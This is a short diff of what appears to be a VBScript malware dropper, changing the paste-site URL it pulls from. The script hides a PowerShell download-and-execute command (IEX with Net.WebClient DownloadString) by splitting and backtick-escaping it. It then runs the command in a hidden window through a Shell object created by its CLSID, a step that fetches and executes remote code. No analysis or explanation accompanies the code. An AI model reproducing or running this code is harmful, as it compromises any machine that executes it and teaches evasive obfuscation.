@@ -1,7 +1,7 @@
 k1 = "Powershell I`E`X ((n`e`W-Ob`jEcT (('Net.Webclie"  
 k2 = "nt'))).(('Downloadst" 
 k3 = "ring')).'InVokE'((('https://paste" 
-k4 = "bin.mozilla.org/t1Oa415oxR/raw'))))" 
+k4 = "bin.mozilla.org/Cb9sSOud/raw'))))" 
 VAR = "new:F935DC22-1CF0-11D" 
 set g = GetObject(VAR+"0-ADB9-00C04FD58A0B") 
 g.Run k1+k2+k3+k4 , 0
